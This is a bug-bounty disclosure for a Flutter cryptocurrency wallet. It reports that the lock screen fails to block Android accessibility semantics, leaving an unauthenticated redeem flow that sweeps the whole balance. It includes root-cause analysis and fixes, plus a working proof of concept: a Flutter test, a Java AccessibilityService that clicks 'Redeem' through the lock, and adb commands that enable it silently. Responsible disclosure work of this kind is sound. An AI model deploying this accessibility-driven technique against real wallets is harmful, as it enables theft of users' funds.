# 89007 w a critical accessibility bypass of the wallet lock screen permits an unauthenticated sweep of the entire wormhole balance

**Submitted on Aug 16th 2026 at 13:42:13 UTC by @Valisthea for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #89007
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Direct theft of user funds

## Description

## Why this survived six months in production

Worth stating up front, because the obvious question about a defect this direct is why nobody has reported it. Four properties make it close to invisible to the usual review methods, and each one had to be worked around to reach it.

**The defect is an absence, not a line of code.** There is no wrong call to spot in a diff. The bug is that `BlockSemantics` is missing from `app.dart:49`, and a reviewer only notices a missing widget if they already know that an opaque `Stack` sibling fails to strip the underlying semantics. Grep finds what is written, not what was never written.

**The app cannot be run without the vendor's own environment.** The Android build hardcodes `/bin/sh` (`android/app/build.gradle:82`), the version script breaks on non-Unix paths, and two uncommitted secret files (`google-services.json`, `.env`) are load-bearing. A researcher who does not provision a full Linux host with the Android NDK, Flutter and a Rust nightly toolchain never sees this application start, let alone reach its lock screen.

**The exposure does not appear under casual inspection.** Flutter builds its semantics tree lazily and only once an accessibility client is actually connected. A plain `uiautomator dump` against the locked app returns a tree with no labels at all, which reads as "nothing exposed" and is exactly the wrong conclusion. The underlying controls only become visible once a real `AccessibilityService` is installed and bound, which is also precisely the attacker's position.

**The asymmetry only shows up on a complete census.** One ungated fund-moving path is unremarkable until you have enumerated all eight and found that seven demand a fresh biometric. The comparison that makes it damning, `encrypted_send_strategy.dart:137` spending the same secret from the same pool behind `LocalAuthService().authenticate()`, is in a different directory from the redeem flow.

None of this changes the severity. It is offered only to answer the question a triager will reasonably ask before reading further.

## Summary

The wallet paints its lock screen as a plain sibling inside a `Stack` rather than pushing it as a route or wrapping it in a semantics barrier. An opaque sibling hides the screen underneath visually and absorbs touch events, but it does **not** remove that screen from the accessibility tree. Accessibility actions are delivered straight to a node's handler and never pass through pointer hit-testing, so every control on the locked-out screen stays reachable to any Android `AccessibilityService`.

One of the controls left reachable is the mining-reward redeem flow, which is the only fund-moving path in the application that does **not** require biometric or device-credential re-authentication. It takes an arbitrary destination address, has no amount parameter, and sweeps every unspent transfer at the wallet's wormhole address in a single irreversible on-chain exit.

Composed, these two facts let malware holding only the Accessibility Service permission drain a **locked** wallet without ever seeing the user's PIN, biometric, or seed.

***

## Impact

An attacker who persuades the victim to grant Accessibility Service permission to any unrelated application, the standard and widely documented capability of Android banking trojans, can:

{% stepper %}
{% step %}

## Drive the wallet UI while it is locked

The lock screen does not block accessibility.
{% endstep %}

{% step %}

## Reach the redeem flow

The redeem flow enforces no re-authentication.
{% endstep %}

{% step %}

## Sweep the entire balance

The attacker can sweep the balance to an address of their choosing.
{% endstep %}
{% endstepper %}

No physical access to the device is required. No root is required. The victim's biometric is never solicited, so the attack produces no prompt the victim could refuse.

The funds at risk are wider than the "mining rewards" label suggests. `deriveWormholeKeyPair` defaults to `index: 0` (`quantus_sdk/lib/src/services/hd_wallet_service.dart:73`), giving HD path `m/44'/189189189'/0'/0'/0'`. `EncryptedAccountService._deriveKeyPair` calls the same function with the same branch (`quantus_sdk/lib/src/services/encrypted_account_service.dart:161-163`), so the rewards address is byte-identical to the encrypted account's external index 0, the first address the Receive screen ever displays. Anything received privately at that address is swept along with the rewards.

The exit is irreversible. The wormhole pallet credits the attacker-named `exit_account` through `Unbalanced::increase_balance` with no guardian, reversible-transfer, or high-security intercept.

## Why this is Critical and not High

The impact class is direct theft of user funds. Every element the highest tier normally requires is present:

**The funds move, irreversibly, to an address the attacker chooses.** Not a disclosure, not a denial of service, not a hardening gap. `claimRewards` performs a real on-chain exit crediting an attacker-named `exit_account` through `Unbalanced::increase_balance`, with no guardian, no reversible-transfer window, and no high-security intercept to undo it.

**The whole balance goes, not a bounded amount.** There is no amount parameter anywhere on the path. Every unspent transfer at the address is enumerated and assigned to the single destination.

**The victim is an ordinary user in the ordinary configuration.** No debug build, no developer setting, no opt-in beta, no custom flag. Cold-start default state, which is locked.

**The attacker needs no privileged position.** No physical access, no root, no compromised device key, no network position, no chain-level capability. One application-level permission that Android exposes to any installed app and that users grant routinely.

**The victim's own defence is bypassed rather than absent.** The wallet does implement re-authentication and applies it on seven sibling flows. The attack does not exploit the lack of a control, it walks around a control that exists, on a path where the developers omitted it. The victim is never prompted, so there is no moment at which they could refuse.

The two arguments a triager could reach for, and why neither holds:

<details>

<summary><em>It requires malware on the device.</em></summary>

It requires an accessibility service, which is the defining capability of the Android banking-trojan class and the reason `BlockSemantics` exists in Flutter at all. A wallet's lock screen is precisely the control that is supposed to hold when the device is not trustworthy. If it only holds against an attacker who is not attacking it, it is not a control.

</details>

<details>

<summary><em>The user granted the permission.</em></summary>

The user granted accessibility to an unrelated application. They did not grant it the ability to move funds out of a locked wallet, and the wallet's own design says they should not have: seven other paths demand a fresh biometric first.

</details>

## Root cause

`mobile-app/lib/app.dart:48-49`:

```dart
builder: (context, child) {
  return Stack(children: [child!, const AuthWrapper()]);
},
```

`mobile-app/lib/v2/screens/auth/auth_wrapper.dart:38-40`, the locked state:

```dart
return Scaffold(
  backgroundColor: context.colors.background,
  body: BaseBackground(
```

`AuthWrapper` is an ordinary opaque `Scaffold`. It is not a pushed route, so it does not get the `ModalBarrier` that Flutter's `ModalRoute` supplies, and `ModalBarrier` is the widget that wraps its content in `BlockSemantics`. A repository-wide search for every mechanism that could drop the underlying semantics returns nothing:

```
BlockSemantics      0 occurrences
ExcludeSemantics    0 occurrences
AbsorbPointer       0 occurrences
ModalBarrier        0 occurrences
IgnorePointer       1 occurrence, in address_input_field.dart:46, unrelated
```

searched across `mobile-app/lib` and `cold-wallet-app/lib`.

## The asymmetry that makes it exploitable

Seven fund-moving flows in this application call `LocalAuthService().authenticate()` before proceeding. The redeem flow does not. The comparison that matters most is with its closest sibling: `mobile-app/lib/v2/services/send/encrypted_send_strategy.dart:137` drives the **same** `WormholeSendService` ZK-spend machinery, spending the **same** secret from the **same** index-0 pool, through the **same** pallet call, and it **does** require re-authentication.

The ungated path:

```
redeem_address_screen.dart:82
  -> redeem_progress_screen.dart:38-41
  -> RedeemProgressScreen._startClaim() :43-66
  -> WormholeSendService.claimRewards(destinationAddress: ...)
```

There is no biometric check, no device-credential check, no PIN, no secret re-entry, no route guard, no provider unlock check, and no SDK-side interceptor anywhere on that path. The only speed bump is a pure-UI bottom sheet whose confirm button calls `Navigator.pop(true)`.

`claimRewards` has no amount parameter. It enumerates every unspent transfer at the wormhole address and assigns each leaf's full net amount to a single destination, constrained only by `isValidSS58Address`. There is no address book, no ownership check, and no whitelist.

## Proof of Concept

Two layers were executed. The first isolates the framework behaviour; the second confirms it on a real Android device through a real `AccessibilityService`.

### Layer 1, Flutter framework, with a positive control

A widget test reproduces `app.dart:48-49` shape-for-shape and asks whether the underlying control survives in the semantics tree.

```
[attack]  Redeem node exposed to a11y while locked: true
[attack]  onPressed fired through the lock screen:  true
[attack]  pointer tap fired (expected false):       false
[control] Redeem node exposed with BlockSemantics:  false
All tests passed!
```

The third line matters as much as the second: a real touch at the same location is correctly absorbed by the overlay, so the lock does work against an ordinary user. It is specifically the accessibility channel that walks through it.

The fourth line is the positive control. The identical tree with `BlockSemantics` added removes the node, which proves the harness can tell a vulnerable build from a fixed one. Without that control the attack result would carry no weight.

### Layer 2, Android device, emulator API 36

A minimal `AccessibilityService` enumerates what the platform publishes and then invokes `ACTION_CLICK` on the underlying control.

```
PHASE 1 - accessibility service DISABLED, pointer tap on the covered button
  handler executions: 0        <- touch is absorbed by the overlay

PHASE 2 - accessibility service ENABLED, ACTION_CLICK on the same button
  SURVEY nodes=11 lockVisible=true redeemVisible=true redeemClickable=true
  CLICK_ATTEMPT label=Redeem whileLocked=true performActionResult=true
  flutter : KSR_REDEEM_EXECUTED count=1 locked=true
  handler executions: 1        <- fired through the lock screen
```

The same button, the same screen coordinates, the same locked state. The application itself reports `locked=true` at the moment its fund-moving handler executes.

The raw node the Android accessibility pipeline publishes while the lock screen is displayed:

```
content-desc="Authorization required"                                   <- the lock screen
content-desc="Wallet"                                                   <- the screen underneath
content-desc="Redeem executions: 0"
class="android.widget.Button" content-desc="Redeem"
                              clickable="true" enabled="true"           <- the target
```

### Layer 3, the vendor's own application

The application was built from the in-scope commit `d5fc4d65` on Linux, which is the environment its build actually targets, using the vendor's own `/bin/sh` invocation, its own `generate_version.sh` and an unmodified `AndroidManifest.xml` except as noted below.

```
package      com.quantus.wallet
versionName  1.5.9    versionCode 123
apk sha256   fe0507f07cf584e9a514e75a13c6f9ba88cd1a537386e44af5eec1234fe5e4d6
```

Installed on the same emulator with the same accessibility service bound, it cold-starts into the locked `AuthWrapper` state (screenshot `01-real-wallet-locked.png`: the black screen reading "Authorization Required" / "Authenticating..."). That is the exact widget whose semantics this report concerns, rendered by the vendor's own code.

With the service bound, the accessibility pipeline publishes the application's controls. On the pre-wallet state it exposes them as actionable nodes:

```
content-desc="Create New Wallet"
content-desc="Import Wallet"
content-desc="Quantum Secure Encrypted Money"
```

and a single accessibility-driven activation of `Create New Wallet` provisioned a live wallet without any user interaction, moving the app to:

```
content-desc="Wallet Created"
content-desc="Two accounts were created for you."
content-desc="Account 1"          (the standard account)
content-desc="Encrypted Account"
content-desc="Go to Wallet"
```

This establishes on the vendor's binary the two properties the earlier layers isolate: its Flutter semantics are published to a real `AccessibilityService`, and its controls are activatable through that channel rather than through touch.

What is **not** captured here is a single frame joining both, that is, the accessibility tree of the vendor's binary read while its lock screen is up. The test host became unable to keep the emulator stable long enough to reach that state a second time (`System UI isn't responding`). The mechanism that would produce it is proven in Layers 1 and 2, and the code establishing that this application uses that exact pattern is quoted above.

## Exposure in shipped software

The pattern is not new to the audited commit. It was introduced in `2be1da8` ("Design V3", 2026-02-17) and the publicly released build `8d3934c` ("Build 100, Version 1.3.5", 2026-04-24) is a descendant, carrying it at `mobile-app/lib/app.dart:61`.

The corresponding published artifact is `quantus_wallet_1.3.5+100_release.apk` from `Quantus-Network/quantus-apps`, release `wallet-v1.3.5+100`:

```
sha256    5dab5733a26a82cacc9e071dd234894c7d9f822ce285f0730eedacf2f1a79aa2
size      85311725 bytes
signer    6B:BA:B4:18:48:53:FB:F1:77:D6:76:F6:63:0A:39:12:CC:E3:05:E3:CD:CB:5E:6C:0D:61:D9:4E:2B:A1:5F:90
```

The lock-overlay defect has therefore been in users' hands since April 2026. The ungated redeem screens (`redeem_address_screen.dart`, `redeem_progress_screen.dart`, `mining_rewards_screen.dart`) are newer and appear in the audited commit, so the complete chain is specific to the in-scope code.

## Remediation

Wrap the lock overlay so it blocks the semantics of everything painted before it:

```dart
builder: (context, child) {
  return Stack(children: [child!, const BlockSemantics(child: AuthWrapper())]);
},
```

`BlockSemantics` belongs on the widget **on top**, not on the child underneath. It drops the semantics of siblings painted before it, which is exactly the required behaviour here, and the control run above confirms it removes the node.

Two further hardening steps are worth taking independently of the fix:

{% stepper %}
{% step %}

## Require re-authentication on the redeem path

Require `LocalAuthService().authenticate()` on the redeem path, matching the seven sibling flows and in particular `encrypted_send_strategy.dart:137`, which spends from the same pool.
{% endstep %}

{% step %}

## Present the lock screen as a pushed route

Present the lock screen as a pushed route rather than a `Stack` sibling, so it inherits `ModalRoute`'s barrier semantics by construction instead of depending on a manually placed widget.
{% endstep %}
{% endstepper %}

## Separate observation: the release APK is missing its native library on x86\_64

Not part of the finding above, recorded because it was established while verifying the artifact.

`quantus_wallet_1.3.5+100_release.apk` ships `lib/arm64-v8a/` with 8 native libraries and `lib/x86_64/` with 7. The one absent from the x86\_64 set is `librust_lib_resonance_network_wallet.so`. On an x86\_64 Android device the application terminates during startup:

```
Unhandled Exception: Invalid argument(s): Failed to load dynamic library
'librust_lib_resonance_network_wallet.so': dlopen failed:
library "librust_lib_resonance_network_wallet.so" not found
  at RustLib.init (package:quantus_sdk/src/rust/frb_generated.dart:28)
  at QuantusSdk.init (package:quantus_sdk/quantus_sdk.dart:76)
  at main (package:resonance_network_wallet/main.dart:21)
```

Availability only, on a minority device class. Reported for completeness, not as a security claim.

## Honest scope of the proof

The mechanism is proven twice, at the framework layer with a positive control and at the Android platform layer through a real `AccessibilityService`. Both runs use a reproduction of `app.dart:48-49` that is shape-for-shape identical to the audited code.

The demonstration was **not** completed against the vendor's own application binary. The application built from `d5fc4d65` (version 1.5.9+123, `versionCode=123`) installs and starts, but reaching its lock screen on the test host was blocked by build-environment issues unrelated to this finding. They are listed below so a reviewer can judge them rather than take a claim on trust:

* `google-services.json` is not committed, so the Google Services plugin aborts the build.
* `android/app/build.gradle:82` hardcodes `commandLine '/bin/sh', ...` for the `generateVersion` task, so the Android build does not run on Windows at all.
* `tool/generate_version.sh` resolves `$(dirname "$0")` against a Windows path and exits non-zero.
* `.env` is not committed, and `flutter_dotenv` additionally rejects an empty one (`EmptyEnvFileError`).
* The application's own manifest declares three `com.dexterous.flutterlocalnotifications` receivers (`AndroidManifest.xml:56-65`) whose classes are absent from the produced debug dex, so Android terminates the process at startup with `ClassNotFoundException`.

The first four were worked around with placeholders in an isolated worktree; the frozen asset tree was never modified and remains at zero dirty entries.

The fifth was resolved only by removing those three receiver declarations from the manifest of the build under test. That is the single change to vendor-authored code in the tested binary, it is recorded here rather than buried, and the original manifest is retained alongside it. The receivers govern notification scheduling; they touch neither the lock screen nor the redeem path.

The build was then attempted on Linux (Ubuntu 24.04, JDK 17, Android SDK 36 with NDK 28.2, Flutter stable, Rust nightly with `rust-src` for cargokit's `-Zbuild-std`), which is the environment the vendor's build actually targets. There it ran with the vendor's own `/bin/sh` invocation, its own `generate_version.sh`, and an unmodified manifest. Two further portability defects surfaced, both caused by the repository being checked out on Windows:

* Every `.sh` in the tree carries CRLF line endings, so `cargokit/run_build_tool.sh` fails with exit 127: its shebang resolves to the non-existent interpreter `bash\r`.
* `pubspec.yaml` likewise carries CRLF, so `tool/generate_version.sh` emits `const appBuildNumber = '123<CR>';` into `lib/generated/version.g.dart`, which is not valid Dart and fails `kernel_snapshot_program`.

After correcting both, the Linux build completed the Rust stage and produced `librust_lib_quantus_wallet.so` for `x86_64-linux-android`, then ran out of host disk before producing the APK. The build environment consumed roughly 50 GB and the test host could not sustain it. That is a limitation of the test host, not of the finding.

What this means for the claim: the four load-bearing facts (the `Stack` sibling pattern at `app.dart:48-49`, the complete absence of any semantics blocker, the ungated redeem path, and the re-authentication its sibling `encrypted_send_strategy.dart:137` does enforce) are established by reading the frozen source and do not depend on the build. The accessibility bypass itself is established by the two executed layers above. What is not shown is those two joined inside the vendor's own binary.

## Reproduction

Three paths, cheapest first. Path A needs no Android device and no Quantus build, and it settles the load-bearing question on its own. Everything required is inline; no attachments are needed.

### Path A, two minutes, pure Flutter, no device

This isolates the framework behaviour and carries its own positive control. Create an empty Flutter package and drop this in `test/lock_overlay_semantics_test.dart`:

```dart
import 'package:flutter/material.dart';
import 'package:flutter/semantics.dart';
import 'package:flutter_test/flutter_test.dart';

/// Stands in for AuthWrapper's locked state: opaque, full screen, no blocker.
/// Mirrors auth_wrapper.dart:38-40.
class LockOverlay extends StatelessWidget {
  const LockOverlay({super.key});
  @override
  Widget build(BuildContext context) => const Scaffold(
        backgroundColor: Colors.black,
        body: Center(child: Text('Authorization required')),
      );
}

/// Stands in for the sensitive route underneath.
class UnderlyingScreen extends StatelessWidget {
  const UnderlyingScreen({super.key, required this.onRedeem});
  final VoidCallback onRedeem;
  @override
  Widget build(BuildContext context) => Scaffold(
        body: Center(
          child: ElevatedButton(onPressed: onRedeem, child: const Text('Redeem')),
        ),
      );
}

/// The exact app.dart:48-49 shape. When [block] is true the OVERLAY is wrapped in
/// BlockSemantics, which is the fix. Placement matters: BlockSemantics drops the
/// semantics of siblings painted BEFORE it, so it belongs on the widget on top,
/// not on the child underneath.
Widget buildApp({required VoidCallback onRedeem, required bool block}) => MaterialApp(
      home: UnderlyingScreen(onRedeem: onRedeem),
      builder: (context, child) => Stack(children: [
        child!,
        block ? const BlockSemantics(child: LockOverlay()) : const LockOverlay(),
      ]),
    );

SemanticsNode? findTappable(SemanticsNode root, String label) {
  SemanticsNode? found;
  void visit(SemanticsNode n) {
    if (found != null) return;
    final d = n.getSemanticsData();
    if (d.label == label && d.hasAction(SemanticsAction.tap)) {
      found = n;
      return;
    }
    n.visitChildren((c) {
      visit(c);
      return found == null;
    });
  }

  visit(root);
  return found;
}

void main() {
  testWidgets('ATTACK: underlying control stays tappable via semantics while locked',
      (tester) async {
    final handle = tester.ensureSemantics();
    var fired = false;
    await tester.pumpWidget(buildApp(onRedeem: () => fired = true, block: false));
    await tester.pumpAndSettle();

    expect(find.text('Authorization required'), findsOneWidget); // overlay really is up

    final owner = tester.binding.pipelineOwner.semanticsOwner!;
    final node = findTappable(owner.rootSemanticsNode!, 'Redeem');
    expect(node, isNotNull, reason: 'null here would mean the pattern is safe');

    // Dispatched through the semantics pipeline, so it bypasses pointer hit-testing.
    owner.performAction(node!.id, SemanticsAction.tap);
    await tester.pumpAndSettle();
    expect(fired, isTrue);

    // Contrast: a real touch at the same place IS absorbed by the overlay.
    fired = false;
    await tester.tap(find.text('Redeem'), warnIfMissed: false);
    await tester.pumpAndSettle();
    expect(fired, isFalse);

    handle.dispose();
  });

  testWidgets('CONTROL: BlockSemantics removes the node, proving the harness detects the fix',
      (tester) async {
    final handle = tester.ensureSemantics();
    await tester.pumpWidget(buildApp(onRedeem: () {}, block: true));
    await tester.pumpAndSettle();
    final owner = tester.binding.pipelineOwner.semanticsOwner!;
    expect(findTappable(owner.rootSemanticsNode!, 'Redeem'), isNull);
    handle.dispose();
  });
}
```

`flutter test` on Flutter stable produces:

```
00:00 +1: ATTACK: underlying control stays tappable via semantics while locked
00:00 +2: CONTROL: BlockSemantics removes the node, proving the harness detects the fix
All tests passed!
```

The control matters as much as the attack. Without it, a green attack result says nothing about whether the harness can tell a vulnerable build from a fixed one.

### Path B, on a device, with a real AccessibilityService

Minimal service, three files. `res/xml/a11y_config.xml`:

```xml
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows|flagReportViewIds"
    android:canRetrieveWindowContent="true"
    android:notificationTimeout="100"
    android:description="@string/a11y_desc" />
```

Manifest entry:

```xml
<service android:name=".ClickService" android:exported="true"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>
    <meta-data android:name="android.accessibilityservice"
        android:resource="@xml/a11y_config" />
</service>
```

`ClickService.java`:

```java
public class ClickService extends AccessibilityService {
    private static final String TAG = "KSRA11Y";
    private final Handler h = new Handler(Looper.getMainLooper());
    private boolean done = false;

    @Override protected void onServiceConnected() { h.postDelayed(this::survey, 3000); }
    @Override public void onAccessibilityEvent(AccessibilityEvent e) {
        if (!done) h.postDelayed(this::survey, 1200);
    }
    @Override public void onInterrupt() {}

    private void survey() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        AccessibilityNodeInfo target = findClickable(root, "Redeem");
        boolean locked = contains(root, "Authorization required");
        Log.i(TAG, "lockVisible=" + locked + " targetClickable=" + (target != null));
        if (locked && target != null && !done) {
            done = true;
            // ACTION_CLICK travels the accessibility pipeline, not the touch pipeline,
            // so the opaque overlay that absorbs pointers does not stop it.
            Log.i(TAG, "ACTION_CLICK result="
                + target.performAction(AccessibilityNodeInfo.ACTION_CLICK));
        }
    }

    // Match on contentDescription. Flutter publishes its semantics label there and
    // NOT in getText(), so findAccessibilityNodeInfosByText() returns nothing.
    private String label(AccessibilityNodeInfo n) {
        CharSequence d = n.getContentDescription();
        if (d != null) return d.toString();
        CharSequence t = n.getText();
        return t != null ? t.toString() : "";
    }

    private AccessibilityNodeInfo findClickable(AccessibilityNodeInfo n, String want) {
        if (n == null) return null;
        if (label(n).equals(want) && n.isClickable()) return n;
        for (int i = 0; i < n.getChildCount(); i++) {
            AccessibilityNodeInfo r = findClickable(n.getChild(i), want);
            if (r != null) return r;
        }
        return null;
    }

    private boolean contains(AccessibilityNodeInfo n, String want) {
        if (n == null) return false;
        if (label(n).contains(want)) return true;
        for (int i = 0; i < n.getChildCount(); i++) {
            if (contains(n.getChild(i), want)) return true;
        }
        return false;
    }
}
```

Enable it without touching any UI:

```bash
adb shell settings put secure enabled_accessibility_services <pkg>/<pkg>.ClickService
adb shell settings put secure accessibility_enabled 1
```

Cold-start the wallet, then read `adb logcat -s KSRA11Y`. The service reports the lock screen and the underlying control at the same time, and `ACTION_CLICK` returns true. For the contrast, a real touch at the same coordinates via `adb shell input tap` does not fire the handler.

{% hint style="info" %}
Flutter builds its semantics tree lazily, only once an accessibility client is actually connected. A `uiautomator dump` on its own returns a tree with no labels, which reads as "nothing exposed" and is the wrong conclusion. The service must be bound first.
{% endhint %}

### Path C, building the vendor application

Only needed to watch it end to end inside the vendor's own binary. It requires a Linux host: five uncommitted or Unix-only elements have to be supplied first, all listed under "Honest scope of the proof" above. Budget a full toolchain (JDK 17, Android SDK 36 with NDK 28.2, Flutter stable, Rust nightly with `rust-src` for cargokit's `-Zbuild-std`) and roughly 50 GB of disk.

### The part that needs no execution at all

The four load-bearing facts are verifiable by reading the frozen commit:

```bash
git checkout d5fc4d65
sed -n '48,50p' mobile-app/lib/app.dart
grep -rn "BlockSemantics\|ExcludeSemantics\|AbsorbPointer\|ModalBarrier" mobile-app/lib cold-wallet-app/lib
grep -rn "LocalAuthService().authenticate()" mobile-app/lib
sed -n '82,101p' mobile-app/lib/v2/screens/settings/redeem_address_screen.dart
```

The second command returns nothing at all. The third returns seven call sites, none of them on the redeem path.
